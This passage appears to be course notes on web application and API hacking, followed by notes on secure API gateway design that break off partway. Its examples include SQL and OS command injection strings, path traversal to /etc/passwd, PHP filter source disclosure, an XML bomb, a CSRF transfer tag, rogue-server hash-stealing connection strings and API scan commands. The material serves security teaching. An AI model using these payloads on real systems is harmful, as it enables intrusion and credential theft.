
---

# Comprehensive Guide to Web Application Hacking and Security

## Module 1: Introduction to Web Application Hacking

### 1.1 Understanding Web Applications

Web applications are software programs that run on web servers and are accessed by users through web browsers over the Internet. They form the backbone of modern digital business, supporting everything from e-commerce and banking to social networking and cloud-based productivity tools. Unlike traditional desktop applications, web applications are accessible from any device with a browser, making them both powerful and vulnerable.

The architecture of a web application typically involves three main components:
- **Client-Side Interface:** The front-end that users interact with, built using HTML, CSS, and JavaScript. It runs in the user's browser and manages presentation and user experience.
- **Server-Side Logic:** The back-end processing engine that handles business logic, authentication, data validation, and database interactions. It commonly uses languages like PHP, Python, Java, .NET, or Node.js.
- **Database Layer:** The storage system where all persistent data resides, including user credentials, personal information, transaction records, and application configuration. Common databases include MySQL, PostgreSQL, Microsoft SQL Server, and Oracle.

### 1.2 The Attack Surface of Web Applications

The attack surface of a web application encompasses all points where an attacker can try to enter data or extract information. This includes input forms, URL parameters, HTTP headers, cookies, API endpoints, file upload mechanisms, and third-party integrations. Each of these represents a potential vector for exploitation if not properly validated and secured.

### 1.3 The Hacker's Perspective

From an attacker's viewpoint, web applications present attractive targets because they are:
- Publicly accessible over the Internet
- Often connected to valuable databases containing personal and financial information
- Frequently developed under time pressure, leading to security oversights
- Dependent on complex technology stacks with known vulnerabilities
- Subject to misconfiguration during deployment and maintenance

---

## Module 2: Injection and Input Validation Attacks

### 2.1 Overview of Injection Attacks

Injection attacks represent one of the most dangerous and prevalent categories of web application vulnerabilities. They occur when an application sends untrusted data to an interpreter as part of a command or query. By crafting malicious input that is syntactically correct for the interpreter being targeted, attackers can trick the application into executing unintended commands or accessing unauthorized data.

The fundamental problem enabling injection attacks is insufficient input validation. When applications fail to properly sanitize user-supplied data before using it in commands, queries, or dynamic code execution, they open the door for attackers to manipulate the interpretation of that data.

### 2.2 Web Scripts Injection

Web scripts injection occurs when user input is incorporated into dynamically executed code. Attackers craft input that breaks out of the intended data context and injects executable commands that run on the server. This type of attack is particularly dangerous because the injected code executes with the same privileges as the application itself.

For example, consider a PHP application that dynamically includes files based on user input:
```php
include($_GET['page'] . '.php');
```
An attacker could manipulate this to execute arbitrary code by injecting unexpected file paths or wrapper protocols.

### 2.3 SQL Injection

SQL injection is the most notorious form of injection attack. It involves inserting malicious SQL statements into entry fields that are then passed to a database for execution. The consequences can be devastating, including:
- Bypassing authentication mechanisms
- Extracting sensitive data from the database
- Modifying or deleting database contents
- Executing administrative operations on the database server
- In some cases, issuing commands to the operating system

A classic example involves a login form where the application constructs a query like:
```sql
SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'
```
An attacker entering `admin' --` as the username would transform the query into:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
```
The double dash comments out the password check, granting access as the admin user.

For complete coverage of SQL injection concepts and techniques, certification materials reference Module 15, which provides an exhaustive treatment of blind SQL injection, time-based attacks, out-of-band exploitation, and automated tooling.

### 2.4 OS Command Injection

Operating system command injection exploits applications that pass user input to system-level commands. This attack allows an attacker to execute arbitrary commands on the host operating system with the privileges of the web application process.

Attackers typically append or chain commands using shell metacharacters such as:
- `;` (semicolon) – Command separator
- `&&` (double ampersand) – Execute next command only if previous succeeds
- `||` (double pipe) – Execute next command only if previous fails
- `|` (single pipe) – Pipe output of one command to another
- `` ` `` (backticks) – Command substitution

For instance, an application that pings a user-specified address using `system("ping " + user_input)` could be exploited by entering `127.0.0.1; cat /etc/passwd`, which would execute the ping command and then display the password file.

### 2.5 LDAP Injection

Lightweight Directory Access Protocol (LDAP) injection targets applications that construct LDAP statements from user input. LDAP is commonly used for authentication and directory services in enterprise environments. By manipulating LDAP filters, attackers can:
- Bypass authentication requirements
- Extract sensitive information from the directory
- Modify directory objects
- Escalate privileges within the system

LDAP injection exploits non-validated web application input vulnerabilities to pass LDAP filters. The attack works by injecting LDAP metacharacters such as `*` (wildcard), `&` (AND), `|` (OR), and parentheses to modify the logic of the LDAP query.

### 2.6 XPath Injection

XPath injection targets applications that use XML data stores and query information using XPath expressions. When user input is directly concatenated into XPath queries without proper sanitization, attackers can inject malicious XPath expressions to:
- Bypass authentication
- Extract entire XML databases
- Modify the structure of XPath queries
- Interfere with application logic

XPath injection is particularly dangerous because XPath lacks access control mechanisms. A successful injection can expose the entire XML document, whereas SQL injection might be limited by database permissions.

### 2.7 SMTP Injection

SMTP injection exploits applications that construct email messages using user input without proper sanitization. By injecting arbitrary SMTP commands, attackers can:
- Send spam emails through the victim's mail server
- Modify email headers to spoof sender addresses
- Inject additional recipients into messages
- Potentially exploit vulnerabilities in mail processing systems

The attack typically involves injecting carriage return and line feed characters (CRLF – `%0d%0a`) to terminate the intended header and inject new SMTP commands or headers.

### 2.8 Buffer Overflow

Buffer overflow attacks involve injecting more data than an input field can handle, causing the excess data to overflow into adjacent memory locations. This can lead to:
- Application crashes (denial of service)
- Execution of arbitrary code
- Corruption of critical data structures
- Bypassing of security controls

Buffer overflows exploit applications written in languages like C and C++ that do not perform automatic bounds checking on arrays and buffers. While less common in modern web applications, they remain relevant in underlying systems and libraries.

### 2.9 File Injection

File injection attacks exploit "dynamic file include" mechanisms in web applications. When applications dynamically include files based on user input without proper validation, attackers can:
- Include malicious remote files that execute on the server
- Read sensitive local files
- Execute arbitrary code by including files containing attacker-controlled content

This attack is closely related to Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities, which are detailed in a separate section.

### 2.10 Canonicalization Attacks

Canonicalization attacks manipulate variables that reference files using "dot-dot-slash" (`../`) sequences to access restricted directories. The attack exploits differences in how various components in the request processing chain interpret and canonicalize file paths. By using encoded or alternative representations of path traversal characters, attackers can bypass security filters and access unauthorized files.

---

## Module 3: Local File Inclusion (LFI)

### 3.1 Understanding LFI Vulnerabilities

Local File Inclusion vulnerabilities enable attackers to include files on a server through a web browser. An LFI vulnerability occurs when an application includes files without proper validation of inputs, allowing attackers to modify the input and embed path traversal characters. This vulnerability can be exploited to read configuration files, source code, logs, and other sensitive data stored on the server.

The fundamental weakness lies in PHP applications that pass user input directly to file inclusion functions:
```php
$file = $_GET['page'];
require($file);
```
This code blindly includes whatever file path the user provides, with no validation of the path or restriction on which files can be accessed.

### 3.2 Basic LFI Exploitation

The simplest LFI attack uses path traversal sequences to navigate the file system and access sensitive files. For example:
```
http://xyz.com/page=../../../../../etc/passwd
```
This URL instructs the application to traverse up five directories from the web root and include the system's password file. Depending on the server configuration, this file may contain user account information.

### 3.3 Evading Appended Extensions

Many developers attempt to secure against LFI by appending a file extension to the included file:
```php
$file = $_GET['page'];
require($file . ".php");
```
This makes direct file inclusion more difficult because requesting `/etc/passwd` results in the application trying to include `/etc/passwd.php`, which does not exist.

Attackers have developed several techniques to bypass this protection:

**Null Byte Injection:** By appending a null byte (`%00`) to the attack string, attackers can terminate the string early in older versions of PHP (prior to 5.3.4):
```
http://xyz.com/page=../../../../../etc/passwd%00
```

**Question Mark Technique:** Adding a question mark to the attack string treats the appended extension as a query string parameter:
```
http://xyz.com/page=../../../../../etc/passwd?
```

**Path Truncation:** On some systems, very long paths can be truncated, discarding the appended extension.

### 3.4 Bypassing PHP Execution

LFI vulnerabilities can read `.txt` files, but not `.php` files directly, because `.php` files get executed by the server and their source code is not displayed. To retrieve the source code of PHP files, attackers use built-in PHP filters:

**Base64 Encoding Filter:**
```
http://xyz.com/index.php?page=php://filter/convert.base64-encode/resource=index
```
This converts the PHP file to Base64 encoding, which the browser displays as encoded text. The attacker can then decode this locally to obtain the original source code:
```bash
base64 -d savefile.php
```

**Other PHP Wrappers:**
- `php://filter/read=string.rot13/resource=filename` – ROT13 encoding
- `zip://path/to/zipfile#filename` – Access files within ZIP archives
- `data://text/plain;base64,PAYLOAD` – Execute arbitrary PHP code

---

## Module 4: Attacking Application Logic Flaws

### 4.1 Understanding Application Logic Flaws

Most application flaws occur due to the negligence and false assumptions of web developers. Logic flaws differ from other vulnerabilities because they are not associated with common signatures, making them difficult to identify with automated scanners. These flaws require an understanding of the business logic and careful manual testing to discover.

Application logic flaws vary among different types of web applications and are not restricted to a particular pattern. However, knowledge of previously exploited applications with common logic flaws provides insight into how to approach finding similar issues in other applications.

### 4.2 Forced Browsing and Workflow Bypass

A common example of logic flaw exploitation involves retail web applications. The typical purchasing process includes:
1. Selecting the product
2. Finalizing the order
3. Providing payment details
4. Providing delivery details

The developer assumes customers will follow all levels in sequence. However, using proxy tools such as Burp Suite, attackers can attempt to bypass stages by manipulating requests. This is called forced browsing.

By jumping directly from the second stage (order finalization) to the fourth stage (delivery details), an attacker might avoid payment entirely while still receiving the product. This can result in severe financial losses if exploited on a large scale.

### 4.3 Exploitation Using Burp Suite

Burp Suite is the primary tool for identifying and exploiting application logic flaws. The process involves:
1. Configuring the browser to route traffic through Burp Suite's proxy
2. Navigating through the application's normal workflow while capturing all requests
3. Analyzing the request parameters that control workflow progression
4. Manipulating these parameters to skip steps or bypass controls
5. Replaying modified requests to test for vulnerabilities

The Repeater tool in Burp Suite is particularly useful for this purpose, allowing attackers to modify and resend individual requests multiple times while observing the server's responses.

### 4.4 WebSocket Manipulation

WebSocket connections, which provide full-duplex communication channels, can also be manipulated for logic attacks. The process involves:
1. Capturing the WebSocket handshake in Burp Suite
2. Cloning the connection using the "Clone" function
3. Manipulating the raw request to inject malicious parameters or alter the communication flow
4. Establishing the new, manipulated connection
5. Sending crafted messages through the compromised channel

This technique allows attackers to bypass client-side validation, inject unexpected data, or manipulate real-time communication between the client and server.

---

## Module 5: Attacking Shared Environments

### 5.1 Understanding Shared Hosting Risks

Organizations increasingly leverage third-party service providers for hosting and maintaining their web applications. These providers serve multiple clients using the same infrastructure, creating opportunities for cross-tenant attacks. A malicious client may attempt to compromise the security of another organization's web application hosted on the same infrastructure, or a client deploying a vulnerable application may inadvertently expose other hosted applications to attack.

### 5.2 Attacks on the Access Mechanism

Service providers typically offer administrative web interfaces for configuring and managing web applications and databases remotely. These access mechanisms present several attack vectors:

**Vulnerability Exploitation:** Attackers check whether the remote access mechanism has unpatched vulnerabilities or configuration errors that can be exploited. These may include default credentials, exposed debugging interfaces, or known vulnerabilities in the management software.

**Credential Capture:** By exploiting vulnerabilities in the access mechanism, attackers may capture credentials used by administrators to manage their applications, providing unauthorized access to web applications and their databases.

**Privilege Separation:** Poor configuration may give customers excessive privileges, such as shell access instead of file access. This allows attackers to execute arbitrary commands on the server, access sensitive files, and potentially compromise other hosted applications.

### 5.3 Attacks Between Applications

Vulnerabilities in one web application can enable attacks against other applications in the same shared environment:

**Remote Command Execution:** Vulnerable scripts can allow attackers to execute operating system commands. For example, a Perl script with a command injection vulnerability:
```perl
my $command = param("cmd");
system($command);
```
This allows attackers to execute arbitrary OS commands like `whoami` or more destructive operations.

**Cross-Application SQL Injection:** An SQL injection vulnerability in one application may allow attackers to run arbitrary SQL commands that access databases shared across multiple applications. This can lead to:
- Retrieving data belonging to other applications
- Manipulating data across the shared environment
- Potentially gaining administrative access to the database server

---

## Module 6: Database Connectivity Attacks

### 6.1 Understanding Database Connection Strings

Database connection strings are used to connect applications to database engines. They contain the information needed to establish a connection, including:
- Server address and port
- Database name
- Authentication credentials
- Security and encryption settings
- Connection pooling parameters

A typical connection string for Microsoft SQL Server:
```
"Data Source=Server,Port; Network Library=DBMSSOCN; Initial Catalog=DataBase; User ID=Username; Password=pwd;"
```

Database connectivity attacks exploit the way applications connect to the database rather than abusing database queries. These attacks can result in unauthorized control over the database and access to sensitive information.

### 6.2 Connection String Injection

Connection string injection occurs when dynamic string concatenation is used to build connection strings based on user input. In a delegated authentication environment, attackers inject parameters by appending them with a semicolon character.

**Before Injection:**
```
"Data Source=Server,Port; Network Library=DBMSSOCN; Initial Catalog=DataBase; User ID=Username; Password=pwd;"
```

**After Injection:**
```
"Data Source=Server,Port; Network Library=DBMSSOCN; Initial Catalog=DataBase; User ID=Username; Password=pwd; Encryption=off"
```

The attacker parses the connection string using the "last one wins" algorithm, substituting legitimate values with hostile input. In this example, encryption is disabled, potentially exposing sensitive data in transit.

### 6.3 Connection String Parameter Pollution (CSPP)

CSPP attacks specifically exploit semicolon-delimited database connection strings constructed dynamically from user inputs. Attackers overwrite parameter values to achieve various malicious objectives:

**Hash Stealing:** Attackers replace the Data Source parameter with a rogue Microsoft SQL Server under their control. By setting Integrated Security to true, the application attempts to authenticate to the rogue server using Windows credentials:
```
Data source=myServer; user id=; Data Source=Rogue Server; Password=; Integrated Security=true;
```
The rogue server captures the Windows password hashes, which can be cracked offline.

**Port Scanning:** By manipulating the Target Server and Target Port values, attackers can probe internal network services:
```
Data source=myServer; user id=; Data Source=TargetServer, TargetPort; Password=; Integrated Security=true;
```
Different error messages reveal which ports are open and which services are listening.

**Hijacking Web Credentials:** Attackers overwrite the Integrated Security parameter to connect using the web application's system account instead of the user's credentials:
```
Data source=myServer; user id=; Data Source=Target Server, Target Port; Password=; Integrated Security=true;
```

### 6.4 Connection Pool Denial of Service

Connection pooling improves performance by maintaining a pool of active database connections that can be reused. However, this mechanism can be exploited for denial of service attacks.

In ASP.NET, the default maximum connections in the pool is 100, with a timeout of 30 seconds. An attacker can examine the connection pooling settings and:
1. Construct a large, time-consuming SQL query
2. Run 100 such queries simultaneously, each with an execution time of 30+ seconds
3. Consume all available connections in the pool within 30 seconds

This causes database queries to fail for legitimate users, preventing them from using database-related parts of the application.

---

## Module 7: Client-Side Attacks

### 7.1 Understanding Client-Side Attacks

Attacks performed on server-side applications can infect client-side applications when they interact with malicious servers or process malicious data. Client-side attacks occur when the client establishes a connection with the server; if there is no connection, there is no risk because the server cannot pass malicious data to the client.

### 7.2 Cross-Site Scripting (XSS)

Cross-Site Scripting allows attackers to bypass client access controls and inject malicious scripts into web pages. These scripts can:
- Steal session cookies and authentication tokens
- Rewrite HTML content
- Redirect users to malicious sites
- Capture keystrokes and form submissions
- Perform actions on behalf of the victim

XSS attacks are categorized as:
- **Reflected XSS:** Malicious script is reflected off the web server in an error message, search result, or other response
- **Stored XSS:** Malicious script is permanently stored on the target server in a database, forum post, or comment
- **DOM-based XSS:** The vulnerability exists in client-side code rather than server-side code

### 7.3 HTTP Header Injection

Attackers split an HTTP response into multiple responses by injecting malicious content into HTTP headers. This can be used to:
- Deface websites by injecting content into the response body
- Poison web caches with malicious content
- Trigger cross-site scripting by injecting script tags
- Perform session fixation by setting cookies

The attack exploits CRLF injection vulnerabilities in applications that include user input in HTTP response headers without proper sanitization.

### 7.4 Request Forgery Attacks

Request forgery attacks exploit the trust that a website or web application places in a user's browser. The attack works by including a link or script on a malicious page that causes the victim's browser to make requests to a target site where the victim is already authenticated.

**Cross-Site Request Forgery (CSRF):** Forces authenticated users to execute unwanted actions on a web application. For example, a crafted image tag:
```html
<img src="http://bank.com/transfer?amount=1000&to=attacker">
```
When the victim's browser loads this image, it makes a request to the banking site, potentially transferring funds if the victim has an active session.

### 7.5 Additional Client-Side Attacks

**Frame Injection:** When scripts do not validate their input, attackers can inject code through frames. This affects all browsers and scripts that do not validate untrusted input, allowing attackers to overlay legitimate content with malicious frames.

**Session Fixation:** Attackers authenticate using a known session ID and then trick users into using the same session ID. When the user authenticates, the attacker can hijack the now-validated session.

**ActiveX Attacks:** Attackers exploit vulnerabilities in ActiveX controls through malicious websites or email links, potentially gaining access privileges equal to authorized users.

**Privacy Attacks:** These attacks involve tracking users across websites using persistent browser state, such as cookies, local storage, or browser fingerprinting techniques.

**Redirection Attacks:** Attackers create links that appear legitimate but redirect users to malicious websites where credentials may be captured.

---

## Module 8: Web Services Attacks

### 8.1 Understanding Web Services

Web services work atop legacy web applications, and any attack on a web service immediately exposes the underlying application's business and logic vulnerabilities. Web applications use web services to implement functionality, and if the integrated services are vulnerable, the applications themselves become vulnerable.

### 8.2 Web Services Probing Attacks

WSDL (Web Services Description Language) files contain sensitive information about service ports, connections, and operations. Web services probing involves:
1. Trapping the WSDL document from web service traffic
2. Analyzing it to determine application purpose, functional breakdown, entry points, and message types
3. Creating a set of valid requests by selecting operations and formulating messages according to XML Schema rules
4. Submitting these requests with malicious content in SOAP requests
5. Analyzing error messages to understand security weaknesses

### 8.3 SOAP Injection

SOAP injection involves injecting malicious query strings in user input fields to bypass web service authentication mechanisms and access backend databases. This attack works similarly to SQL injection but targets the SOAP message structure.

Attackers inject special characters such as single quotes, double quotes, semicolons, and SQL commands into SOAP parameters. If the web service does not properly validate or sanitize these inputs, the injected code executes against the backend database.

### 8.4 SOAPAction Spoofing

Every SOAP request contains an operation that is executed by the application. When transmitted over HTTP, an additional header called SOAPAction informs the receiving web service about the operation without requiring XML parsing.

Attackers exploit this optimization to manipulate the SOAPAction header. For example, a web service with `createUser` and `deleteAllUsers` operations might be protected by a gateway that only allows authorized users to perform the latter. An attacker can send a request with `SOAPAction: "deleteAllUsers"` while the SOAP body contains a `createUser` operation. The gateway passes the message based on the SOAP body, but the web service may execute the action specified in the header.

Tools like WS-Attacker can automate SOAPAction spoofing attacks by reading WSDL files and sending manipulated SOAP messages.

### 8.5 WS-Address Spoofing

WS-Addressing provides additional routing information in the SOAP header to support asynchronous communication. It includes elements like `ReplyTo` and `FaultTo` that specify where responses should be sent.

In a WS-Address spoofing attack, an attacker sends a SOAP message containing fake WS-Address information. The `ReplyTo` header contains the address of an endpoint chosen by the attacker rather than the legitimate web service client. The endpoint chosen by the attacker receives responses that were intended for the legitimate client, potentially exposing sensitive data or enabling further attacks.

### 8.6 XML Injection

Web applications sometimes store data such as user credentials in XML documents. Attackers identify the XPath used to query these documents and insert XML injection to bypass authentication.

XML injection involves injecting XML data and tags into user input fields to:
- Manipulate XML schema
- Populate XML databases with bogus entries
- Bypass authorization mechanisms
- Escalate privileges
- Generate web services denial of service attacks

### 8.7 Web Services Parsing Attacks

Parsing attacks exploit vulnerabilities in the XML parser's processing capabilities:

**Recursive Payloads:** Attackers query web services with grammatically correct SOAP documents containing infinite processing loops. This exhausts XML parser and CPU resources, causing denial of service.

**Oversize Payloads:** Attackers send excessively large payloads to consume all system resources, rendering web services inaccessible to legitimate users.

### 8.8 Web Service Attack Tools

**SoapUI:** A web service testing tool supporting multiple protocols including SOAP, REST, HTTP, JMS, AMF, and JDBC. Attackers use it for web service probing, SOAP injection, XML injection, and web service parsing attacks.

**XMLSpy:** An XML editor and development environment for modeling, editing, transforming, and debugging XML-related technologies.

---

## Module 9: Web API and Webhooks

### 9.1 Understanding Web APIs

A Web API is an application programming interface that provides online web services to client-side applications for retrieving and updating data from multiple online sources. It is a special type of interface where interactions between applications can be allowed through the Internet and web-based protocols.

### 9.2 Web Service API Types

**SOAP API:** A web-based communication protocol enabling interactions between applications on different platforms via XML and HTTP. SOAP-based APIs generate, recover, modify, and erase different logs such as profiles, credentials, and business leads.

**REST API:** An architectural style of web service serving as a communication medium between various systems on the web. REST APIs allow requesting machines to receive prompt access and redefine web resource representations using stateless protocols and standard operations.

**RESTful API:** A RESTful service designed using REST principles and HTTP communication protocols. RESTful is a collection of resources using HTTP methods such as PUT, POST, GET, and DELETE. Features include:
- Stateless: Client end stores session state; server restricts data saving during request processing
- Cacheable: Client should save responses in cache, enhancing API performance
- Client-Server Environment: Both client and server independent; server handles backend, client handles frontend
- Uniform Interface: Resources recognized via single URL using standard protocol methods
- Layered System: Multiple-layer architecture allows intermediary servers to supply shared memory
- Code on Demand: Server can provide temporary executable code to customize client functionality

**XML-RPC:** Communication protocol using specific XML format to transfer data, simpler than SOAP, using less bandwidth.

**JSON-RPC:** Communication protocol serving same purpose as XML-RPC but using JSON format instead of XML.

### 9.3 Understanding Webhooks

Webhooks are user-defined HTTP callback or push APIs that are raised based on events triggered, such as receiving a comment on a post or pushing code to a registry. Webhooks allow applications to update other applications with the latest information.

Once invoked, webhooks supply data to other applications, meaning users instantly receive real-time information. They are sometimes called "Reverse APIs" as they provide what is required for API specification, and developers create an API to use a webhook.

### 9.4 Webhooks vs. APIs

- Webhooks are automated messages from websites to the server; APIs are used for server-to-website communication
- Webhooks get reports or notifications via HTTP POST only when a new update is made; APIs make calls irrespective of data updates
- Webhooks update applications or services with real-time information; APIs need additional implementations to perform this activity
- Webhooks have less control over data flow; APIs have easy control over data flow

### 9.5 OWASP Top 10 API Security Risks

**API1: Broken Object-Level Authorization**
APIs often expose endpoints managing object identifiers, broadening the attack surface. Attackers exploit API endpoints vulnerable to broken object-level authorization by manipulating the ID of an object sent within the request. Unauthorized access to user objects can result in data disclosure, loss, or manipulation.

**API2: Broken Authentication**
Authentication mechanisms often implemented incorrectly, allowing attackers to compromise tokens or exploit implementation flaws to assume other users' identities. Attackers can gain complete control of other users' accounts, read their personal data, and perform sensitive actions on their behalf.

**API3: Broken Object Property Level Authorization**
Developers may expose all object properties to clients without considering individual sensitivity, relying on clients for data filtering. Unauthorized access to private/sensitive object properties may result in data disclosure, loss, or corruption.

**API4: Unrestricted Resource Consumption**
Attackers initiate multiple concurrent requests using automated tools to cause DoS via high traffic loads. They find APIs that do not limit client interactions or resource consumption and craft API requests controlling the number of resources.

**API5: Broken Function-Level Authorization**
Complexity in access control policies through different hierarchies, groups, and roles can cause authorization errors between administrative and regular functions. Allows attackers to gain access to administrative functions or users' resources.

**API6: Unrestricted Access to Sensitive Business Flows**
Vulnerable APIs expose business flows such as purchasing tickets or posting comments without considering potential harm from excessive automated use. Attackers understand the business model backed by the API, find sensitive business flows, and automate access to cause business harm.

**API7: Server-Side Request Forgery**
SSRF flaw enables attacker to coerce application to send crafted request to unexpected destination, even when protected by firewall or VPN. Attackers exploit this by finding API endpoints that access URIs provided by clients. Leads to internal service enumeration, information disclosure, bypassing firewalls.

**API8: Security Misconfiguration**
Attackers frequently search for unpatched flaws, common endpoints, services with insecure default configurations, or unprotected files and directories. They use automated tools to detect and exploit misconfigurations, potentially leading to full server compromise.

**API9: Improper Inventory Management**
Attackers gain unauthorized access through old, unpatched API versions or endpoints with weaker security requirements. They can access sensitive data or take over the server when different API versions are connected to the same database.

**API10: Unsafe Consumption of APIs**
Developers tend to trust data received from third-party APIs more than user input, adopting weaker security standards. Attackers target integrated third-party services instead of trying to compromise the target API directly. May lead to exposure of sensitive information, different types of injections, or denial of service.

---

## Module 10: API Hacking Methodology

### 10.1 Phase 1: Identify the Target

Before hacking an API, attackers need to identify the target and its perimeter:

**HTTP Protocol Analysis:** APIs such as SOAP and REST mostly use HTTP protocol for communicating messages. HTTP is a text-based protocol where header information is transmitted in readable format. Attackers can easily manipulate these headers to identify the target.

**Message Format Analysis:** API messages transmitted over the web take some format such as JSON for REST API and XML for SOAP API. If used incorrectly, they can pave the way for vulnerabilities. These formats are easy to understand, allowing attackers to manipulate messages to identify the target and its perimeter.

### 10.2 Phase 2: Detect Security Standards

APIs implement different authentication/authorization standards:
- OpenID Connect
- SAML
- OAuth 1.X and 2.X
- WS-Security
- SSL/TLS for transport-level security

Although SSL is used for security, in most API messages, only sensitive user data such as credit card details are encrypted, leaving other information in plaintext. If security standards are configured improperly, attackers can identify vulnerabilities. For example, an attacker can capture and reuse a session token to retrieve a legitimate user's account information that is not encrypted.

### 10.3 API Enumeration with Kiterunner

Kiterunner is an advanced tool designed for API scanning and contextual content discovery, specifically tailored for modern web applications that heavily rely on APIs. It outshines conventional tools by not just brute-forcing directories but also by discovering and understanding complex API endpoint structures through context-aware scanning.

**Commands for scanning API endpoints:**
- Single target: `kr scan https://target.com:8443/ -w routes.kite -A apiroutes-210228:20000 -x 10 --ignore-length=34`
- Single target with both HTTP and HTTPS: `kr scan target.com -w routes.kite -A apiroutes-210228:20000 -x 10 --ignore-length=34`
- List of targets: `kr scan targets.txt -w routes.kite -A apiroutes-210228:20000 -x 10 --ignore-length=34`

### 10.4 Phase 3: Identify the Attack Surface

**API Metadata Vulnerabilities:** API metadata reveals technical information such as paths, parameters, and message formats. REST API uses metadata formats such as Swagger, RAML, API-Blueprint, and I/O Docs, while SOAP API uses WSDL/XML-Schema.

**API Discovery:** If an API does not use metadata, attackers monitor and record the communication between the API and an existing client to identify the initial attack surface. They configure a local proxy to record traffic, configure the client to use this proxy, and then use automated tools to generate metadata from recorded traffic.

**Brute Force:** If other techniques fail, attackers try to identify API paths and arguments through brute-forcing. Common API paths used by developers include `api`, `/api/v2`, `/apis.json`, etc.

**Analysis with Postman:** Postman allows attackers to capture API traffic, including requests, responses, and cookies, using its built-in proxy. It can intercept requests and responses for HTTP or HTTPS websites.

### 10.5 Phase 4: Launch Attacks

**Fuzzing:** Attackers repeatedly send random input to the target API to generate error messages revealing critical information. Automated scripts send numerous requests with varying combinations of input parameters. Tools like Fuzzapi are used for API fuzzing.

**Invalid Input Attacks:** Attackers provide invalid inputs such as sending text in place of numbers, numbers in place of text, more characters than expected, or null characters to extract sensitive information from unexpected system behavior and error messages. They also manipulate HTTP headers and values targeting both API logic and the HTTP protocol.

**Malicious Input Attacks:** Attackers inject malicious input directly to target both the API and its hosting infrastructure. This includes XML bomb attacks:
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  ...
  <!ENTITY lol9 "&lol8;...">
]>
<lolz>&lol9;</lolz>
```
When processed by a vulnerable XML parser, this expands exponentially, causing memory-out-of-bound errors.

Another method involves uploading malicious script files (e.g., uploading a shell script instead of a PDF document), resulting in execution of the malicious script to bypass security mechanisms.

**Injection Attacks:** Similar to traditional web applications, APIs are vulnerable to SQL injection:
```
http://billpay.com/api/v1/cust/'%20or%20'1'='1
```
This transforms the SQL query to return all customer details. APIs are also vulnerable to JSON, JavaScript, XPath, XSLT, XSS, and CSRF attacks.

### 10.6 Authentication and Authorization Attacks

**Login/Credential Stuffing Attacks:** Attackers target login systems because these attacks are difficult to detect and stop using typical API security solutions. Credential stuffing exploits password reuse across multiple platforms. Attackers automate previously identified credential pairs using tools like Sentry MBA and PhantomJS.

**API DDoS Attacks:** Involves saturating an API with a massive volume of traffic from multiple infected computers (botnet) to delay API services to legitimate users. Attackers use botnets created to stay within API rate limit controls to increase attack potential.

### 10.7 OAuth Attacks

OAuth is an authorization protocol allowing users to grant limited access to their resources on one site to another without exposing credentials.

**Attack on 'Connect' Request:** Attackers exploit the connect operation by opening a fake account on the provider, initiating the connect operation with the client, but halting authorization server redirects. They then create a malicious page that uses CSRF to make the victim log out on the provider and re-login using the attacker's fake account.

**Attack on 'redirect_uri':** If attackers identify XSS vulnerabilities on a web page in the client domain, they can exploit them to capture authorization codes by setting up a malicious page that exfiltrates the code to the attacker.

**CSRF on Authorization Response:** Attackers perform CSRF attacks to connect a fake provider account with the victim's client account by storing an authorization code and persuading the victim to send a request that completes the connection.

**Access Token Reusage:** OAuth requires unique access tokens for individual clients, but tokens provided for one client may work for another. Attackers exploit this by developing a legitimate client application, gaining access to the victim's tokens, and using them on other clients.

**SSRF Using Dynamic Client Registration Endpoint:** Hidden URLs for special registration endpoints mapped to `/register` can be exploited. Vulnerable parameters include `logo_uri`, `jwks_uri`, and `request_uris`, which can trigger SSRF attacks.

---

# API


# Secure API Architecture: Detailed Notes

## 1. Context: Why Secure API Architecture is Critical

APIs are fundamental to modern web applications, acting as gateways for communication between different systems (e.g., a mobile app and a backend server). However, they introduce unique security challenges:

- **Poor Programming Practices:** Developers may inadvertently introduce flaws (e.g., broken object-level authorization, improper input validation).
- **Transparency & Exposure:** APIs are designed to be discoverable and accessible, which inherently increases their attack surface.
- **Sophisticated Threats:** APIs are vulnerable to the latest cyber-attacks, including injection, DDoS, and authorization exploits.

To safeguard APIs, a dedicated **secure API architecture** is required, not just piecemeal code fixes. This architecture must include effective security strategies and mitigation policies.

## 2. The Core Component: API Gateway

The foundation of secure API architecture is the **API Gateway**.

### What is an API Gateway?
- It is a hardened appliance (available in physical or virtual form) that acts as a secure reverse proxy.
- It is installed in the organization's **Demilitarized Zone (DMZ)** .
- It sits between the internal application (backend) and the external public internet, mediating all traffic.

### Security Capabilities and Controls Provided by an API Gateway:
- **Access Control:** Manages which clients can access which API resources.
- **Threat Detection:** Identifies and blocks malicious patterns (e.g., SQL injection, XSS in API calls).
- **Confidentiality & Integrity:** Ensures data is encrypted in transit (TLS) and not tampered with.
- **Authentication & Authorization:** Verifies the identity of the caller (e.g., via OAuth, JWT) and checks their permissions.
- **Message Validation:** Validates the structure and content of API requests (e.g., XML/JSON schema validation).
- **Rate Limiting & Quotas:** Controls the number of requests a client can make in a specific time frame to prevent abuse and DoS attacks.
- **Audit Management:** Logs all API activity for monitoring and forensic analysis.

## 3. The Principle: Separation of Concerns

A key design principle is the logical separation of API implementation from API security.

| Role | Primary Focus | Responsibility |
| :--- | :--- | :--- |
| **API Developer** | Application Domain | - Properly designing API endpoints and functionality.<br>- Ensuring correct integration with backend applications/databases.<br>- Is **not** responsible for securing the published API. |
| **API Security Professional** | Security Domain | - Applying security policies to published APIs.<br>- Configuring and managing the API Gateway.<br>- Focusing on identity management, threat analysis, and data security.<br>- Uses advanced security tools separate from the API codebase. |

> **Benefit:** This allows developers to focus on business logic and security experts to focus on protection, without either stepping on the other's toes.

## 4. The Strategy: Implementing Layered Security (5 Layers)

Instead of relying on a single checkpoint, secure API architecture uses multiple layers. The document provides a scenario of an API fetching company transactions to illustrate this:

**Layer 1: User Validation (Authentication)**
- **Action:** The API validates if the requesting entity (user/system) is an authorized user of the company.
- **Security Mechanism:** API security logic checks credentials/permissions.
- **Failure Example:** If unauthorized, the API returns a generic exception like `Company Not Found` (without revealing why).

**Layer 2: Middleware Query Planning (Authorization Context)**
- **Action:** Before querying data, a middleware layer intercepts the request to formulate a query plan.
- **Security Mechanism:** The database layer is forced to declare and apply a filter (e.g., `WHERE company_id = X`) before executing the request.
- **Failure Example:** If the required filter is missing, the system returns an exception like `Unsafe Data Query`, preventing accidental data leaks.

